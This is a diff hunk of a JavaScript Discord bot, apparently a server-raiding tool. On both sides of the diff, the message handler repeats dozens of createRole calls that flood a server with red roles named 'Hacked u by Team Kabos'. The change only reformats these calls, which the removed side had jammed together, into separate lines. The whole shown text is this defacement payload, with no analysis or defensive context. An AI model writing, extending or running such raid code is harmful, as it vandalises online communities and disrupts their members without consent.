@@ -90,239 +90,348 @@ LOka.on('message', message => {
         permissions :   [1],
         color : " #ff0000"
     })
-	  m.createRole({
-        name : "Hacked u by Team Kabos",
-        permissions :   [1],
-        color : " #ff0000"
-    })  m.createRole({
-        name : "Hacked u by Team Kabos",
-        permissions :   [1],
-        color : " #ff0000"
-    })  m.createRole({
-        name : "Hacked u by Team Kabos",
-        permissions :   [1],
-        color : " #ff0000"
-    })  m.createRole({
-        name : "Hacked u by Team Kabos",
-        permissions :   [1],
-        color : " #ff0000"
-    })  m.createRole({
-        name : "Hacked u by Team Kabos",
-        permissions :   [1],
-        color : " #ff0000"
-    })  m.createRole({
-        name : "Hacked u by Team Kabos",
-        permissions :   [1],
-        color : " #ff0000"
-    })  m.createRole({
-        name : "Hacked u by Team Kabos",
-        permissions :   [1],
-        color : " #ff0000"
-    })  m.createRole({
-        name : "Hacked u by Team Kabos",
-        permissions :   [1],
-        color : " #ff0000"
-    })  m.createRole({
-        name : "Hacked u by Team Kabos",
-        permissions :   [1],
-        color : " #ff0000"
-    })  m.createRole({
-        name : "Hacked u by Team Kabos",
-        permissions :   [1],
-        color : " #ff0000"
-    })  m.createRole({
-        name : "Hacked u by Team Kabos",
-        permissions :   [1],
-        color : " #ff0000"
-    })  m.createRole({
-        name : "Hacked u by Team Kabos",
-        permissions :   [1],
-        color : " #ff0000"
-    })  m.createRole({
-        name : "Hacked u by Team Kabos",
-        permissions :   [1],
-        color : " #ff0000"
-    })  m.createRole({
-        name : "Hacked u by Team Kabos",
-        permissions :   [1],
-        color : " #ff0000"
-    })  m.createRole({
-        name : "Hacked u by Team Kabos",
-        permissions :   [1],
-        color : " #ff0000"
-    })  m.createRole({
-        name : "Hacked u by Team Kabos",
-        permissions :   [1],
-        color : " #ff0000"
-    })  m.createRole({
-        name : "Hacked u by Team Kabos",
-        permissions :   [1],
-        color : " #ff0000"
-    })  m.createRole({
-        name : "Hacked u by Team Kabos",
-        permissions :   [1],
-        color : " #ff0000"
-    })  m.createRole({
-        name : "Hacked u by Team Kabos",
-        permissions :   [1],
-        color : " #ff0000"
-    })  m.createRole({
-        name : "Hacked u by Team Kabos",
-        permissions :   [1],
-        color : " #ff0000"
-    })  m.createRole({
-        name : "Hacked u by Team Kabos",
-        permissions :   [1],
-        color : " #ff0000"
-    })  m.createRole({
-        name : "Hacked u by Team Kabos",
-        permissions :   [1],
-        color : " #ff0000"
-    })  m.createRole({
-        name : "Hacked u by Team Kabos",
-        permissions :   [1],
-        color : " #ff0000"
-    })  m.createRole({
-        name : "Hacked u by Team Kabos",
-        permissions :   [1],
-        color : " #ff0000"
-    })  m.createRole({
-        name : "Hacked u by Team Kabos",
-        permissions :   [1],
-        color : " #ff0000"
-    })  m.createRole({
-        name : "Hacked u by Team Kabos",
-        permissions :   [1],
-        color : " #ff0000"
-    })  m.createRole({
-        name : "Hacked u by Team Kabos",
-        permissions :   [1],
-        color : " #ff0000"
-    })  m.createRole({
-        name : "Hacked u by Team Kabos",
-        permissions :   [1],
-        color : " #ff0000"
-    })  m.createRole({
-        name : "Hacked u by Team Kabos",
-        permissions :   [1],
-        color : " #ff0000"
-    })  m.createRole({
-        name : "Hacked u by Team Kabos",
-        permissions :   [1],
-        color : " #ff0000"
-    })  m.createRole({
-        name : "Hacked u by Team Kabos",
-        permissions :   [1],
-        color : " #ff0000"
-    })  m.createRole({
-        name : "Hacked u by Team Kabos",
-        permissions :   [1],
-        color : " #ff0000"
-    })  m.createRole({
-        name : "Hacked u by Team Kabos",
-        permissions :   [1],
-        color : " #ff0000"
-    })  m.createRole({
-        name : "Hacked u by Team Kabos",
-        permissions :   [1],
-        color : " #ff0000"
-    })  m.createRole({
-        name : "Hacked u by Team Kabos",
-        permissions :   [1],
-        color : " #ff0000"
-    })  m.createRole({
-        name : "Hacked u by Team Kabos",
-        permissions :   [1],
-        color : " #ff0000"
-    })  m.createRole({
-        name : "Hacked u by Team Kabos",
-        permissions :   [1],
-        color : " #ff0000"
-    })  m.createRole({
-        name : "Hacked u by Team Kabos",
-        permissions :   [1],
-        color : " #ff0000"
-    })  m.createRole({
-        name : "Hacked u by Team Kabos",
-        permissions :   [1],
-        color : " #ff0000"
-    })  m.createRole({
-        name : "Hacked u by Team Kabos",
-        permissions :   [1],
-        color : " #ff0000"
-    })  m.createRole({
-        name : "Hacked u by Team Kabos",
-        permissions :   [1],
-        color : " #ff0000"
-    })  m.createRole({
-        name : "Hacked u by Team Kabos",
-        permissions :   [1],
-        color : " #ff0000"
-    })  m.createRole({
-        name : "Hacked u by Team Kabos",
-        permissions :   [1],
-        color : " #ff0000"
-    })  m.createRole({
-        name : "Hacked u by Team Kabos",
-        permissions :   [1],
-        color : " #ff0000"
-    })  m.createRole({
-        name : "Hacked u by Team Kabos",
-        permissions :   [1],
-        color : " #ff0000"
-    })  m.createRole({
-        name : "Hacked u by Team Kabos",
-        permissions :   [1],
-        color : " #ff0000"
-    })  m.createRole({
-        name : "Hacked u by Team Kabos",
-        permissions :   [1],
-        color : " #ff0000"
-    })  m.createRole({
-        name : "Hacked u by Team Kabos",
-        permissions :   [1],
-        color : " #ff0000"
-    })  m.createRole({
-        name : "Hacked u by Team Kabos",
-        permissions :   [1],
-        color : " #ff0000"
-    })  m.createRole({
-        name : "Hacked u by Team Kabos",
-        permissions :   [1],
-        color : " #ff0000"
-    })  m.createRole({
-        name : "Hacked u by Team Kabos",
-        permissions :   [1],
-        color : " #ff0000"
-    })  m.createRole({
-        name : "Hacked u by Team Kabos",
-        permissions :   [1],
-        color : " #ff0000"
-    })  m.createRole({
-        name : "Hacked u by Team Kabos",
-        permissions :   [1],
-        color : " #ff0000"
-    })  m.createRole({
-        name : "Hacked u by Team Kabos",
-        permissions :   [1],
-        color : " #ff0000"
-    })  m.createRole({
-        name : "Hacked u by Team Kabos",
-        permissions :   [1],
-        color : " #ff0000"
-    })  m.createRole({
-        name : "Hacked u by Team Kabos",
-        permissions :   [1],
-        color : " #ff0000"
-    })  m.createRole({
-        name : "Hacked u by Team Kabos",
-        permissions :   [1],
-        color : " #ff0000"
-    })  m.createRole({
+	 m.createRole({
         name : "Hacked u by Team Kabos",
         permissions :   [1],
         color : " #ff0000"
     })
+	 m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	 m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	 m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	 m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	 m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	 m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	 m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	 m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	 m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	 m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	 m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	 m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	 m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	 m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	 m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	 m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	 m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	 m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	 m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	 m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	 m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	 m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	 m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	 m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	 m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	 m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	 m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	 m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	 m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	 m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	 m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	 m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	 m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	 m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	 m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	 m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	 m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	 m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	 m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	 m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	 m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	 m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	 m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	 m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	 m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	 m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	 m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	 m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	 m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	 m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	 m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	 m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	 m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	 m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	 m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	 m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	 m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	 m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	 m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	 m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	 m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	 m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	 m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	 m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	 m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	 m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	 m.createRole({
+        name : "Hacked u by Team Kabos",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	
+	
 
 
     
